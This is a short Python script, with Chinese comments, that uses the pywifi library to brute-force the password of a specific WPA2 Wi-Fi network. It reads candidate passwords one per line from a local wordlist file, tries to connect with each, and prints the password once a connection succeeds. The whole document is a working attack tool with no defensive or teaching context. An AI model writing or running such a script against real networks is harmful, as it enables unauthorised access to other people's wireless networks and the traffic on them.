import pywifi
from pywifi import const
import time
import sys


def wifi_connect(pfile):
    wifi = pywifi.PyWiFi()
    inter = wifi.interfaces()[0]
    conn = inter.add_network_profile(pfile)
    inter.connect(conn)
    time.sleep(3)
    if inter.status() == const.IFACE_CONNECTED:
        print("连接成功,密码：{}".format(pfile.key))
        sys.exit(0)
    inter.remove_all_network_profiles()

def wifi_file(password):
    pfile = pywifi.Profile()
    #wifi名称
    pfile.ssid = 'CMCC-fdCs' 
    #网卡的开放状态
    pfile.auth = const.AUTH_ALG_OPEN
    #wifi算法,一般算法为psk
    pfile.akm.append(const.AKM_TYPE_WPA2PSK)
    #加密单元
    pfile.cipher = const.CIPHER_TYPE_CCMP
    #wifi密码
    pfile.key = password
    return pfile


f = open("C:\\Users\\62417\\Desktop\\wifi.txt","r")
while True:
    try:
        passwd = f.readline()
        if not passwd:
            f.close()
            print("密码本没有密码")
            break
        print("密码为：{}".format(passwd))
        files = wifi_file(passwd)
        wifi_connect(files)
    except:
        continue
